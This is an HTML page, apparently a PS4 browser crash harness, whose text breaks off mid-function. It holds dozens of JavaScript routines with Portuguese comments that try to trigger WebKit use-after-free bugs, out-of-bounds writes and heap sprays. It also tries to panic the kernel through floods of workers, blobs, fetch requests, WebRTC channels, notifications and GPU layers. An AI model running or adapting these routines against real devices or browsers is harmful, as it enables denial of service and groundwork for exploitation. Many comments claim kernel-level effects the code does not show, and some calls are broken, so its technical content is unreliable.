<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Corruption & Kernel Panic v38000</title>

</head>
<body>

<h2>--- WEBKIT (USERLAND RCE) ---</h2>

<button onclick="crashWebKitSort()">01. Array.sort() Backing Store Resize (Heap Overflow)</button>
<button onclick="crashWebKitRegExp()">02. RegExp Sticky Flag Integer Overflow (JIT/YARR Crash)</button>
<button onclick="crashWebKitMap()">03. Map Iterator Double Free (Use-After-Free Write)</button>
<button onclick="crashFrameDetach()">01. IFrame Detach Access (WindowProxy Use-After-Free)</button>
<button onclick="crashCSSRecursion()">02. CSS Variables Cyclic Calc (Engine Stack Overflow)</button>
<button onclick="crashStringRope()">03. Huge String Rope Flattening (Heap Buffer Overflow)</button>
<button onclick="crashAudioCycle()">01. AudioContext Cyclic Graph Connection (Use-After-Free)</button>
<button onclick="crashExecCommand()">02. document.execCommand 'InsertHTML' Nesting (Layout Crash)</button>
<button onclick="crashArrayFrom()">03. Array.from Iterator Resize Side-Effect (Heap Write)</button>
<button onclick="crashCanvasPattern()">01. Canvas CreatePattern Source UAF (Use-After-Free)</button>
<button onclick="crashSVGMarker()">02. SVG Marker Cyclic Reference (Stack Exhaustion)</button>
<button onclick="crashEventRace()">03. Event Listener Removal Race (Vector Corruption)</button>
<button onclick="crashProxyRevoke()">01. Proxy Revocation Access (Use-After-Free)</button>
<button onclick="crashSelectOverflow()">02. Select Element Options Length (Heap Overflow)</button>
<button onclick="crashRangeMutation()">03. Range.extractContents Mutation (DOM Corruption)</button>
<button onclick="crashXSLT()">01. XSLTProcessor Transformation UAF (Libxslt Memory Corruption)</button>
<button onclick="crashNodeIterator()">02. NodeIterator DOM Detach (Use-After-Free)</button>
<button onclick="crashTextEncoder()">03. TextEncoder/Decoder Buffer Overflow (String Heap Write)</button>
<button onclick="crashDocWrite()">01. document.write() Re-entrancy (Parser State Corruption)</button>
<button onclick="crashJSONStack()">02. JSON.parse() Deep Nesting (Stack Overflow/Exhaustion)</button>
<button onclick="crashCSSRules()">03. CSSStyleSheet.insertRule() Massive Flood (Heap Spray)</button>
<button onclick="crashWorkerTerm()">01. Worker.terminate() Object Transfer Race (Use-After-Free)</button>
<button onclick="crashXHRType()">02. XHR ResponseType Switching Race (Buffer Confusion)</button>
<button onclick="crashTextTrack()">03. HTMLVideoElement TextTrack Cue Flood (C++ Vector Overflow)</button>

<h2>--- KERNEL (RING 0 PANIC) ---</h2>

<button onclick="crashKernelBlob()">04. Blob URL Revoke/Fetch Race (Filesystem UAF)</button>
<button onclick="crashKernelIPC()">05. MessagePort Transfer to Dead Worker (IPC Race)</button>
<button onclick="crashKernelMbuf()">06. XHR/Fetch Large Payload Flood (Mbuf Exhaustion/Corruption)</button>
<button onclick="crashBlobStack()">04. Recursive Blob.slice() Chain (VFS Stack Exhaustion)</button>
<button onclick="crashFetchAbort()">05. Fetch API AbortController Race (Network Socket UAF)</button>
<button onclick="crashPortRace()">06. MessagePort Transfer vs Close Race (IPC Deadlock)</button>
<button onclick="crashWebRTC()">04. WebRTC DataChannel Flood (Network Kernel Panic)</button>
<button onclick="crashIDBRace()">05. IndexedDB VersionChange Transaction Race (File System Lock)</button>
<button onclick="crashNotification()">06. Notification API IPC Flood (Kernel Resource Limit)</button>
<button onclick="crashGPU3D()">04. CSS 3D Layer Bomb (GPU Driver Resource Panic)</button>
<button onclick="crashCacheAPI()">05. Cache API Storage Race (FileSystem Lock Panic)</button>
<button onclick="crashFileStream()">06. FileReader Sync Event Loop Flood (Kernel Pipe Exhaustion)</button>
<button onclick="crashSyncXHR()">04. Synchronous XHR Network Lock (Kernel Thread Starvation)</button>
<button onclick="crashHistoryFlood()">05. History.pushState Large Object Flood (Kernel OOM)</button>
<button onclick="crashStorageStorm()">06. LocalStorage Event IPC Storm (Inter-Process Lag/Panic)</button>
<button onclick="crashWebSocket()">04. WebSocket Open/Close Race (TCP Stack Panic)</button>
<button onclick="crashBlobHandles()">05. Blob URL Handle Exhaustion (Kernel Resource Limit)</button>
<button onclick="crashGamepad()">06. Gamepad API Event Flood (Input Driver Stress)</button>
<button onclick="crashBroadcast()">04. BroadcastChannel IPC Storm (Kernel Message Queue Panic)</button>
<button onclick="crashBlobFrag()">05. Recursive Blob Construction (VFS Metadata Exhaustion)</button>
<button onclick="crashConsole()">06. console.log() High-Speed Flood (Kernel UART/Log Buffer)</button>
<button onclick="crashPingPong()">04. MessagePort IPC High-Speed Ping-Pong (Kernel Deadlock)</button>
<button onclick="crashKeepAlive()">05. Fetch Keep-Alive Socket Exhaustion (TCP Stack Panic)</button>
<button onclick="crashPortLoop()">06. MessagePort Recursive Transfer (Kernel Reference Cycle)</button>

<div id="log">Waiting for trigger...</div>

<script>
    const LOG = document.getElementById('log');

    function log(msg) {
        const div = document.createElement('div');
        div.textContent = `[${new Date().toLocaleTimeString().split(' ')[0]}] ${msg}`;
        LOG.appendChild(div);
        LOG.scrollTop = LOG.scrollHeight;
    }

    // ==========================================
    // WEBKIT TEST 01: Array.sort() OOB Write
    // ==========================================
    // ALVO: Heap do WebKit (Butterfly).
    // MECÂNICA: O sort usa comparadores customizados. Se o comparador redimensionar o array
    // para ser menor (length=0), o algoritmo de sort (C++) pode tentar escrever nos índices
    // antigos, corrompendo a memória vizinha.
    function crashWebKitSort() {
        log("Iniciando Sort OOB...");
        const arr = [1, 2, 3, 4, 5];
        // Adiciona um objeto que força o caminho lento (slow path)
        arr.push({ valueOf: () => 6 });
        
        try {
            arr.sort((a, b) => {
                // MUTATION: Destroi o array no meio da ordenação
                arr.length = 0;
                // Cria lixo para forçar o alocador a reusar a memória antiga
                const filler = new Array(1000).fill(1.1);
                // Retorna comparação válida para o algoritmo C++ continuar
                return a - b;
            });
            // Se chegamos aqui sem crash, verificamos corrupção
            log("Sort finished. Array length: " + arr.length);
        } catch(e) { log("Sort Error: " + e.message); }
    }

    // ==========================================
    // WEBKIT TEST 02: RegExp Sticky Buffer Overflow
    // ==========================================
    // ALVO: Engine de Regex (YARR).
    // MECÂNICA: A flag 'y' (sticky) força o match a partir de lastIndex.
    // Se manipularmos lastIndex para ser MAX_INT, algumas implementações sofrem overflow
    // ao calcular o tamanho do buffer necessário.
    function crashWebKitRegExp() {
        log("Iniciando RegExp Overflow...");
        const re = /A/y; // Sticky flag
        const str = "A".repeat(100000); // String grande
        
        // Overflow potencial em 32-bit (ou wrap em logic complexa)
        re.lastIndex = 0xFFFFFFFF; 
        
        try {
            // Tenta executar. O motor tenta acessar str[0xFFFFFFFF] + offset
            const res = re.exec(str);
            log("RegExp executed safely.");
        } catch(e) { log("RegExp Error: " + e.message); }
    }

    // ==========================================
    // WEBKIT TEST 03: Map Iterator Double Free
    // ==========================================
    // ALVO: Gerenciador de Memória (GC) e Iteradores.
    // MECÂNICA: Limpar um mapa invalida iteradores. Se conseguirmos manter uma referência
    // ao iterador e forçar o motor a usá-lo após a memória ter sido liberada e reocupada.
    function crashWebKitMap() {
        log("Iniciando Map UAF...");
        const m = new Map();
        for(let i=0; i<100; i++) m.set(i, {});
        
        const iter = m.entries();
        // Inicia iteração
        iter.next();
        
        // Destruição violenta
        m.clear();
        
        // Reocupação (Spray)
        // Tenta colocar dados controlados onde o Map estava
        const spray = [];
        for(let i=0; i<100; i++) spray.push({a: 0x41414141});
        
        try {
            // Acesso Use-After-Free
            iter.next(); 
            log("Map Iterator sobreviveu (Safe).");
        } catch(e) { log("Map Error: " + e.message); }
    }

    // ==========================================
    // KERNEL TEST 04: Blob URL VFS Race
    // ==========================================
    // ALVO: Sistema de Arquivos Virtual (VFS) do Kernel.
    // TIPO: Race Condition UAF (High Value).
    // MECÂNICA: Uma thread cria Blobs, outra revoga (deleta). O Kernel tenta travar (lock)
    // o arquivo virtual. Se falhar, acessa ponteiro nulo ou inválido.
    function crashKernelBlob() {
        log("Iniciando Kernel Blob Race...");
        
        // Worker para Fetch contínuo
        const wCode = `
            onmessage = function(e) {
                const url = e.data;
                setInterval(() => {
                    fetch(url).catch(()=>{});
                }, 1);
            }
        `;
        const w = new Worker(URL.createObjectURL(new Blob([wCode], {type:'text/javascript'})));
        
        // Main Thread: Cria e Revoga em loop apertado
        setInterval(() => {
            const b = new Blob(["A".repeat(4096)]); // 4KB Page
            const url = URL.createObjectURL(b);
            w.postMessage(url);
            
            // Race Window: Revoga imediatamente
            URL.revokeObjectURL(url);
        }, 5);
    }

    // ==========================================
    // KERNEL TEST 05: MessagePort IPC Entanglement
    // ==========================================
    // ALVO: IPC (Inter-Process Communication) do Kernel.
    // TIPO: Use-After-Free no manuseio de descritores de arquivo/portas.
    // MECÂNICA: Criar um canal, enviar uma porta para um Worker e matar o Worker IMEDIATAMENTE.
    // O Kernel tenta entregar a mensagem, mas o processo destino morreu.
    function crashKernelIPC() {
        log("Iniciando Kernel IPC Panic...");
        
        // Worker suicida
        const wUrl = URL.createObjectURL(new Blob(["onmessage=()=>close()"], {type:'text/javascript'}));
        
        setInterval(() => {
            const w = new Worker(wUrl);
            const ch = new MessageChannel();
            
            // Envia porta e mata
            w.postMessage("die", [ch.port2]);
            w.terminate();
            
            // Tenta usar a porta órfã na main thread para estressar o cleanup do kernel
            ch.port1.postMessage("ping");
        }, 10);
    }

    // ==========================================
    // KERNEL TEST 06: Socket Buffer (Mbuf) Exhaustion
    // ==========================================
    // ALVO: Stack de Rede do Kernel (FreeBSD Mbufs).
    // TIPO: Resource Exhaustion -> Memory Corruption.
    // MECÂNICA: Usar fetch/XHR para enviar payloads gigantes que fragmentam a memória do kernel.
    // Sem WebSocket, usamos POST Requests massivos.
    function crashKernelMbuf() {
        log("Iniciando Mbuf Corruption...");
        
        // Payload de 1MB
        const payload = new Uint8Array(1024 * 1024).fill(0x41);
        const blob = new Blob([payload]);
        
        // Flood loop
        setInterval(() => {
            // Dispara requests sem esperar resposta (Fire and Forget)
            fetch("/404", { method: "POST", body: blob }).catch(()=>{});
        }, 5);
    }
  // WEBKIT 01: IFrame Detach Access (UAF)
    // ==========================================
    // ALVO: WindowProxy / DOMWindow.
    // MECÂNICA: Criamos um IFrame, guardamos referência à sua janela, removemos o IFrame (detach),
    // e tentamos acessar propriedades da janela morta.
    // O motor deve limpar os ponteiros, mas se falhar, acessamos memória liberada.
    function crashFrameDetach() {
        log("Iniciando Frame Detach...");
        const ifr = document.createElement('iframe');
        document.body.appendChild(ifr);
        
        // Guarda referência vulnerável
        const win = ifr.contentWindow;
        
        // Detach
        ifr.remove();
        
        // Tenta acessar objeto morto
        try {
            // Acesso a propriedades complexas que exigem C++ getter
            const hist = win.history;
            const doc = win.document;
            log("Frame access alive (Safe)");
        } catch(e) {
            log("Frame access blocked: " + e.message);
        }
        
        // Tentativa de spray para reocupar a memória da janela
        const spray = new Array(10000).fill({a: 0x41414141});
    }

    // ==========================================
    // WEBKIT 02: CSS Variables Cyclic Calc (Stack Smash)
    // ==========================================
    // ALVO: CSS Parser / Style Resolver.
    // MECÂNICA: WebKit permite variáveis CSS (--var) e cálculos (calc).
    // Se criarmos um ciclo complexo (A depende de B, B depende de A) dentro de um calc(),
    // podemos estourar a pilha de recursão do motor de renderização.
    function crashCSSRecursion() {
        log("Iniciando CSS Bomb...");
        const div = document.createElement('div');
        div.style.setProperty('--a', 'calc(var(--b) + 1px)');
        div.style.setProperty('--b', 'calc(var(--a) + 1px)');
        
        document.body.appendChild(div);
        
        // Força o navegador a resolver o layout (Recalculate Style)
        try {
            const style = getComputedStyle(div);
            const val = style.getPropertyValue('--a');
            log("CSS Calc handled: " + val);
        } catch(e) {
            log("CSS Error (Safe)");
        }
        
        // Limpeza
        document.body.removeChild(div);
    }

    // ==========================================
    // WEBKIT 03: Huge String Rope Flattening (Heap Overflow)
    // ==========================================
    // ALVO: JSC String Allocator.
    // MECÂNICA: Strings em JS são árvores (Ropes). Se criarmos uma string maior que a memória contígua
    // disponível e forçarmos o "achatamento" (flatten), o alocador pode falhar ou corromper o heap.
    function crashStringRope() {
        log("Iniciando String Rope...");
        // Cria uma string base de 1MB
        let s = "A".repeat(1024 * 1024);
        
        try {
            // Dobra até atingir tamanhos perigosos (256MB+)
            for(let i=0; i<8; i++) s += s;
            
            log("String size: " + (s.length / 1024 / 1024) + " MB");
            
            // Força Flattening (Converter árvore em buffer linear)
            // charAt(0) força a engine a calcular o ponteiro real
            const c = s.charAt(s.length - 1);
            
            // Tenta replace complexo para estressar buffer temporário
            s.replace(/A/g, "B");
            
            log("String Rope Safe");
        } catch(e) {
            log("String Error (OOM Safe): " + e.message);
        }
    }

    // ==========================================
    // KERNEL 04: Recursive Blob.slice() Chain
    // ==========================================
    // ALVO: VFS (Virtual File System) Stack.
    // MECÂNICA: Blobs podem ser criados a partir de fatias (slice) de outros Blobs.
    // Se criarmos uma cadeia A -> B -> C ... -> Z de 10.000 slices, quando o Kernel tentar ler Z,
    // ele precisa recursivamente resolver até A. Isso estoura a Kernel Stack (8KB-16KB limit).
    function crashBlobStack() {
        log("Iniciando Blob Recursion...");
        let blob = new Blob(["base data"]);
        
        // Profundidade da recursão
        const depth = 20000; 
        
        for(let i=0; i<depth; i++) {
            // Cria um novo blob que é uma fatia do anterior
            blob = blob.slice(0, 1);
        }
        
        // Gatilho: Tenta ler o último blob. O Kernel precisa desenrolar a pilha.
        const fr = new FileReader();
        fr.readAsText(blob);
        fr.onloadend = () => log("Blob Read Finished (Safe)");
    }

    // ==========================================
    // KERNEL 05: Fetch API AbortController Race
    // ==========================================
    // ALVO: Network Stack (Sockets).
    // MECÂNICA: Iniciamos milhares de conexões e as abortamos IMEDIATAMENTE.
    // Isso causa uma corrida entre `socket_connect` e `socket_close` no Kernel.
    // Se `close` liberar a estrutura `socket` antes do `connect` terminar, temos UAF.
    function crashFetchAbort() {
        log("Iniciando Fetch Abort Storm...");
        const controller = new AbortController();
        const signal = controller.signal;
        
        // Dispara 500 requests simultâneos
        for(let i=0; i<500; i++) {
            fetch('/', { signal }).catch(()=>{});
        }
        
        // Aborta todos no meio da inicialização
        // Race window crítica
        setTimeout(() => controller.abort(), 0);
    }

    // ==========================================
    // KERNEL 06: MessagePort Transfer vs Close Race
    // ==========================================
    // ALVO: IPC (Inter-Process Communication).
    // MECÂNICA: Transferimos uma porta para outro Worker enquanto chamamos .close() nela.
    // O Kernel precisa decidir se entrega a mensagem ou destrói a porta. Deadlocks ou UAFs são comuns aqui.
    function crashPortRace() {
        log("Iniciando IPC Port Race...");
        const ch = new MessageChannel();
        const w = new Worker(URL.createObjectURL(new Blob(["onmessage=()=>{}"], {type:'text/javascript'})));
        
        // Race:
        // Thread 1: Transfere port2
        w.postMessage("transfer", [ch.port2]);
        
        // Thread 2 (Main): Fecha port2 (que teoricamente já foi enviada)
        // Se a engine JS ainda tiver a referência antes do Kernel processar...
        try {
            ch.port2.close();
            log("Port closed after transfer attempt");
        } catch(e) {
            log("Port Close Error: " + e.message);
        }
    }
    // WEBKIT 01: AudioContext Cyclic Graph Connection (UAF)
    // ==========================================
    // ALVO: WebAudio Engine.
    // MECÂNICA: Criamos nós de áudio e os conectamos em um ciclo infinito (feedback loop).
    // O motor de áudio tenta processar o grafo. Se destruirmos o contexto no meio do processamento,
    // o thread de áudio pode acessar nós já liberados.
    function crashAudioCycle() {
        log("Iniciando Audio Cycle...");
        try {
            const ctx = new (window.AudioContext || window.webkitAudioContext)();
            const osc = ctx.createOscillator();
            const gain = ctx.createGain();
            const script = ctx.createScriptProcessor(4096, 1, 1);
            
            // Conexão Cíclica: Osc -> Gain -> Script -> Gain
            osc.connect(gain);
            gain.connect(script);
            script.connect(gain); // Ciclo!
            gain.connect(ctx.destination);
            
            osc.start();
            
            // Script processa audio e tenta mudar o grafo
            script.onaudioprocess = function(e) {
                // Stress: Cria e desconecta rapidamente
                const tmp = ctx.createGain();
                tmp.connect(ctx.destination);
                tmp.disconnect();
            };
            
            // Race: Fecha o contexto violentamente
            setTimeout(() => {
                ctx.close().catch(()=>{});
                log("Audio Context Closed (Check for Crash)");
            }, 100);
            
        } catch(e) {
            log("Audio Error: " + e.message);
        }
    }

    // ==========================================
    // WEBKIT 02: document.execCommand 'InsertHTML' Nesting
    // ==========================================
    // ALVO: WebCore Editing Engine.
    // MECÂNICA: O comando 'InsertHTML' é notoriamente complexo. Ele parseia HTML e insere no DOM.
    // Se inserirmos HTML que contém tags de formatação aninhadas recursivamente, podemos estourar a stack
    // do parser de edição.
    function crashExecCommand() {
        log("Iniciando ExecCommand Bomb...");
        const div = document.createElement('div');
        div.contentEditable = true;
        document.body.appendChild(div);
        div.focus();
        
        // Cria payload recursivo
        let html = "<b>";
        for(let i=0; i<2000; i++) html += "<i><u>";
        html += "A";
        for(let i=0; i<2000; i++) html += "</u></i>";
        html += "</b>";
        
        try {
            // Executa comando síncrono complexo
            document.execCommand('insertHTML', false, html);
            
            // Se sobreviveu, tenta desfazer (Undo stack stress)
            document.execCommand('undo');
            log("ExecCommand Finished (Safe)");
        } catch(e) {
            log("ExecCommand Error: " + e.message);
        }
        document.body.removeChild(div);
    }

    // ==========================================
    // WEBKIT 03: Array.from Iterator Resize Side-Effect
    // ==========================================
    // ALVO: Heap Allocator.
    // MECÂNICA: Array.from aceita um iterável. Ele aloca memória baseada no tamanho estimado.
    // Se o iterador alterar o tamanho do array fonte durante a cópia, escrevemos fora dos limites.
    function crashArrayFrom() {
        log("Iniciando Array.from OOB...");
        const arr = [1, 2, 3, 4];
        
        // Iterador malicioso
        arr[Symbol.iterator] = function*() {
            yield 1;
            // MUTATION: Esvazia o array fonte
            arr.length = 0;
            // Continua fornecendo dados para o Array.from escrever
            yield 2; yield 3; yield 4; yield 5;
        };
        
        try {
            // Array.from pode ter alocado buffer para 4 itens.
            // O iterador fornece 5. Se não houver realloc check... Heap Overflow.
            const res = Array.from(arr);
            if (res.length > 4) {
                log("Array.from result anomaly: " + res.length, "warn");
            } else {
                log("Array.from Safe");
            }
        } catch(e) { log("Array.from Error: " + e.message); }
    }

    // ==========================================
    // KERNEL 04: WebRTC DataChannel Flood
    // ==========================================
    // ALVO: Network Kernel Stack (Mbufs/SCTP).
    // MECÂNICA: WebRTC cria canais de dados sobre UDP. Criar milhares deles e enviar dados
    // consome buffers de rede do Kernel (Mbufs). Se esgotarmos, o Kernel entra em pânico.
    function crashWebRTC() {
        log("Iniciando WebRTC Flood...", "danger");
        if (!window.RTCPeerConnection) return log("WebRTC not supported");
        
        const pc = new RTCPeerConnection();
        const channels = [];
        
        // Cria 5000 canais de dados (SCTP streams)
        // Isso aloca estruturas no Kernel imediatamente
        try {
            for(let i=0; i<5000; i++) {
                const dc = pc.createDataChannel("crash_" + i);
                dc.onopen = () => dc.send("A".repeat(1000));
                channels.push(dc);
            }
            log("Channels created. Closing abruptly...");
            // Fecha a conexão violentamente enquanto canais tentam inicializar
            pc.close();
        } catch(e) {
            log("WebRTC Limit: " + e.message);
        }
    }

    // ==========================================
    // KERNEL 05: IndexedDB Transaction Race (VFS Panic)
    // ==========================================
    // ALVO: File System Locking.
    // MECÂNICA: IndexedDB usa arquivos no disco. 'upgradeneeded' bloqueia o banco.
    // Tentamos abrir, deletar e atualizar o banco simultaneamente em várias threads.
    function crashIDBRace() {
        log("Iniciando IDB Race...", "danger");
        const name = "CrashDB_" + Math.random();
        
        const workerScript = `
            onmessage = function(e) {
                const name = e.data;
                setInterval(() => {
                    // Tenta abrir com versão superior (força upgrade)
                    indexedDB.open(name, Math.floor(Math.random() * 100) + 2).catch(()=>{});
                }, 5);
            }
        `;
        
        const w1 = new Worker(URL.createObjectURL(new Blob([workerScript], {type:'text/javascript'})));
        const w2 = new Worker(URL.createObjectURL(new Blob([workerScript], {type:'text/javascript'})));
        
        w1.postMessage(name);
        w2.postMessage(name);
        
        // Main thread tenta deletar o banco constantemente
        setInterval(() => {
            indexedDB.deleteDatabase(name).catch(()=>{});
        }, 5);
    }

    // ==========================================
    // KERNEL 06: Notification API IPC Flood
    // ==========================================
    // ALVO: Kernel IPC / Resource Limits.
    // MECÂNICA: Notificações usam chamadas de sistema para alertar o Shell UI.
    // Enviar milhares de notificações causa um flood de IPC do processo WebKit para o processo Shell.
    function crashNotification() {
        log("Iniciando Notification IPC Flood...", "danger");
        
        // Não precisamos de permissão para tentar alocar a estrutura, 
        // o check de permissão ocorre depois da alocação inicial em alguns firmwares.
        try {
            for(let i=0; i<5000; i++) {
                new Notification("Crash " + i);
            }
        } catch(e) {
            log("Notification Limit Hit");
        }
        
        // Se a UI do PS4 congelar ou reiniciar, é um DoS de recurso aceitável
        // se evoluir para Panic por falta de memória de kernel.
    }
    // ==========================================
    // WEBKIT 01: Canvas CreatePattern Source UAF
    // ==========================================
    // ALVO: 2D Graphics Context.
    // MECÂNICA: Usamos uma imagem ou canvas como padrão de preenchimento.
    // Destruímos a fonte (source) enquanto o padrão ainda está sendo usado para desenhar.
    function crashCanvasPattern() {
        log("Iniciando Canvas Pattern UAF...");
        const c = document.createElement('canvas');
        const ctx = c.getContext('2d');
        
        // Cria fonte descartável
        let img = document.createElement('img');
        // Usa SVG data URI para carregamento síncrono/rápido
        img.src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"/>';
        
        img.onload = () => {
            const pattern = ctx.createPattern(img, 'repeat');
            ctx.fillStyle = pattern;
            
            // MUTATION: Remove a referência da imagem e força GC
            img.src = "";
            img = null;
            
            // Tenta usar o padrão que referenciava a imagem morta
            // Stress loop para pegar o momento exato do free
            for(let i=0; i<1000; i++) {
                ctx.fillRect(0, 0, 100, 100);
            }
            log("Canvas Pattern Finished (Safe)");
        };
    }

    // ==========================================
    // WEBKIT 02: SVG Marker Cyclic Reference
    // ==========================================
    // ALVO: SVG Layout Engine.
    // MECÂNICA: Marcadores SVG (setas, pontos) podem referenciar outros marcadores.
    // Um ciclo (A -> B -> A) durante a renderização pode causar recursão infinita no cálculo de layout.
    function crashSVGMarker() {
        log("Iniciando SVG Marker Recursion...");
        const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
        const defs = document.createElementNS("http://www.w3.org/2000/svg", "defs");
        
        const m1 = document.createElementNS("http://www.w3.org/2000/svg", "marker");
        m1.id = "m1";
        const m2 = document.createElementNS("http://www.w3.org/2000/svg", "marker");
        m2.id = "m2";
        
        // Ciclo: m1 usa m2, m2 usa m1
        const p1 = document.createElementNS("http://www.w3.org/2000/svg", "path");
        p1.setAttribute("marker-end", "url(#m2)");
        m1.appendChild(p1);
        
        const p2 = document.createElementNS("http://www.w3.org/2000/svg", "path");
        p2.setAttribute("marker-end", "url(#m1)");
        m2.appendChild(p2);
        
        defs.appendChild(m1);
        defs.appendChild(m2);
        svg.appendChild(defs);
        
        // Elemento visível para disparar renderização
        const line = document.createElementNS("http://www.w3.org/2000/svg", "line");
        line.setAttribute("marker-end", "url(#m1)");
        svg.appendChild(line);
        
        document.body.appendChild(svg);
        
        // Força layout
        try {
            const box = svg.getBBox();
            log("SVG Marker handled (Safe)");
        } catch(e) {
            log("SVG Error: " + e.message);
        }
        document.body.removeChild(svg);
    }

    // ==========================================
    // WEBKIT 03: Event Listener Splice Race
    // ==========================================
    // ALVO: DOM Event Manager (Vector implementation).
    // MECÂNICA: Adicionamos e removemos listeners do mesmo tipo massivamente.
    // Se a implementação interna do vetor de listeners não for thread-safe ou reentrante,
    // podemos corromper o vetor.
    function crashEventRace() {
        log("Iniciando Event Race...");
        const div = document.createElement('div');
        
        const handler = () => {
            // Remove a si mesmo e adiciona outros
            div.removeEventListener('click', handler);
            div.addEventListener('click', handler);
        };
        
        // Adiciona carga inicial
        for(let i=0; i<100; i++) div.addEventListener('click', handler);
        
        // Dispara evento recursivamente
        try {
            div.dispatchEvent(new Event('click'));
            log("Event Race Finished (Safe)");
        } catch(e) {
            log("Event Error: " + e.message);
        }
    }

    // ==========================================
    // KERNEL 04: CSS 3D GPU Exhaustion
    // ==========================================
    // ALVO: GPU Driver (Compositor).
    // MECÂNICA: Criamos milhares de camadas de composição (Compositing Layers) usando transform: translate3d.
    // Cada camada aloca texturas e buffers no driver da GPU. Se excedermos o limite, o driver pode dar Panic.
    function crashGPU3D() {
        log("Iniciando GPU Bomb...", "danger");
        const container = document.createElement('div');
        document.body.appendChild(container);
        
        let count = 0;
        const interval = setInterval(() => {
            // Cria batch de camadas
            const frag = document.createDocumentFragment();
            for(let i=0; i<500; i++) {
                const el = document.createElement('div');
                // Força criação de camada de hardware
                el.style.transform = `translate3d(${Math.random()*100}px, ${Math.random()*100}px, 0)`;
                el.style.width = '10px';
                el.style.height = '10px';
                el.style.background = 'red';
                frag.appendChild(el);
            }
            container.appendChild(frag);
            count += 500;
            
            log(`Layers: ${count}`);
            
            if(count > 20000) {
                clearInterval(interval);
                log("GPU Stress Test Complete (Check for artifacts/lag)");
                // Mantém as camadas para pressionar VRAM
            }
        }, 100);
    }

    // ==========================================
    // KERNEL 05: Cache API Storage Race
    // ==========================================
    // ALVO: Filesystem Driver / Quota Manager.
    // MECÂNICA: A Cache API escreve dados no disco de forma persistente.
    // Escrever e deletar caches grandes em paralelo estressa o sistema de arquivos.
    function crashCacheAPI() {
        log("Iniciando Cache API Race...", "danger");
        const data = new Response(new ArrayBuffer(1024 * 1024)); // 1MB
        
        const key = "crash-cache-" + Date.now();
        
        // Thread de escrita
        caches.open(key).then(cache => {
            const p1 = setInterval(() => {
                cache.put('/test', data.clone()).catch(()=>{});
            }, 10);
            
            // Thread de deleção (Race)
            const p2 = setInterval(() => {
                caches.delete(key).catch(()=>{});
            }, 50);
            
            setTimeout(() => {
                clearInterval(p1);
                clearInterval(p2);
                log("Cache Race Finished");
            }, 5000);
        });
    }

    // ==========================================
    // KERNEL 06: FileReader Sync Flood
    // ==========================================
    // ALVO: Kernel Pipe / Event Loop.
    // MECÂNICA: FileReader lê arquivos da memória ou disco.
    // Disparar milhares de leituras simultâneas pode esgotar descritores de arquivo ou buffers de pipe.
    function crashFileStream() {
        log("Iniciando FileReader Flood...", "danger");
        const blob = new Blob(["A".repeat(1024 * 1024)]); // 1MB Blob
        
        // Tenta 1000 leituras simultâneas
        for(let i=0; i<1000; i++) {
            const fr = new FileReader();
            fr.readAsArrayBuffer(blob);
            // Não esperamos o onload, apenas disparamos para o kernel enfileirar
        }
        log("FileReader Flood Dispatched");
    }
    // WEBKIT 01: Proxy Revocation Access (UAF)
    // ==========================================
    // ALVO: Proxy Internal Slots.
    // MECÂNICA: Um Proxy revogável tem um slot apontando para o objeto alvo.
    // Se revogarmos o proxy DENTRO de um trap (como 'get'), o motor pode tentar acessar o alvo
    // após ele ter sido desligado (nullified) ou liberado.
    function crashProxyRevoke() {
        log("Iniciando Proxy Revoke...");
        let p, revoke;
        
        const target = { a: 1 };
        const handler = {
            get: function(t, k) {
                // VIOLAÇÃO: Revoga o proxy durante o acesso
                revoke();
                // Tenta forçar GC imediato para limpar o alvo
                const junk = new Array(10000).fill(1.1);
                // Retorna valor para continuar a execução interna
                return Reflect.get(t, k);
            }
        };
        
        const pair = Proxy.revocable(target, handler);
        p = pair.proxy;
        revoke = pair.revoke;
        
        try {
            // Acesso que dispara o trap
            const val = p.a;
            log("Proxy Access Safe (Value: " + val + ")");
        } catch(e) {
            log("Proxy Error: " + e.message);
        }
    }

    // ==========================================
    // WEBKIT 02: Select Element Options Length (Heap Overflow)
    // ==========================================
    // ALVO: HTMLSelectElement Internal Array (Options Collection).
    // MECÂNICA: A propriedade .length de um <select> redimensiona o vetor interno de opções.
    // Em versões antigas ou embarcadas do WebKit, definir um tamanho gigante não aloca memória real,
    // mas define o limite lógico. Escrever no final pode causar escrita fora dos limites (OOB Write).
    function crashSelectOverflow() {
        log("Iniciando Select Overflow...");
        const sel = document.createElement('select');
        
        try {
            // Tenta definir tamanho massivo (Heap Overflow potencial)
            sel.length = 0x100000; // 1 milhão de opções
            
            // Acessa o final do vetor lógico
            const opt = document.createElement('option');
            // Tenta forçar a engine a escrever o ponteiro do elemento option
            // num endereço de memória calculado sem bounds check adequado
            sel.options[0xFFFFF] = opt;
            
            log("Select Length: " + sel.length + " (Safe)");
        } catch(e) {
            log("Select Error: " + e.message);
        }
    }

    // ==========================================
    // WEBKIT 03: Range.extractContents Mutation (DOM Corruption)
    // ==========================================
    // ALVO: DOM Range Logic.
    // MECÂNICA: extractContents move nós do DOM. Se usarmos um MutationObserver para
    // alterar a árvore DOM ENQUANTO o Range está extraindo, podemos confundir a lógica de ponteiros.
    function crashRangeMutation() {
        log("Iniciando Range Mutation...");
        const div = document.createElement('div');
        const p = document.createElement('p');
        p.textContent = "Data";
        div.appendChild(p);
        document.body.appendChild(div);
        
        const range = document.createRange();
        range.selectNodeContents(div);
        
        // Observador que destrói o nó sendo movido
        const obs = new MutationObserver(() => {
            if (div.contains(p)) {
                // VIOLAÇÃO: Remove o nó que o Range acha que está movendo
                div.removeChild(p);
                // Suja a memória
                const trash = document.createElement('span');
                trash.id = "trash";
            }
        });
        
        obs.observe(div, { childList: true, subtree: true });
        
        try {
            // O Range começa a mover 'p'. O observer dispara. 'p' some.
            // O Range tenta terminar o movimento com um ponteiro inválido.
            range.extractContents();
            log("Range Extract Finished (Safe)");
        } catch(e) {
            log("Range Error: " + e.message);
        }
        
        document.body.removeChild(div);
    }

    // ==========================================
    // KERNEL 04: Synchronous XHR Network Lock
    // ==========================================
    // ALVO: Kernel Network Stack / Thread Scheduler.
    // MECÂNICA: Requests Síncronos (bloqueantes) travam a thread do navegador.
    // Se fizermos isso em múltiplos Workers simultaneamente para um endpoint que não responde,
    // podemos esgotar as threads de rede do Kernel (Starvation).
    function crashSyncXHR() {
        log("Iniciando Sync XHR Deadlock...", "danger");
        
        const code = `
            onmessage = () => {
                try {
                    const xhr = new XMLHttpRequest();
                    // False = Síncrono (Depreciado mas funcional e perigoso)
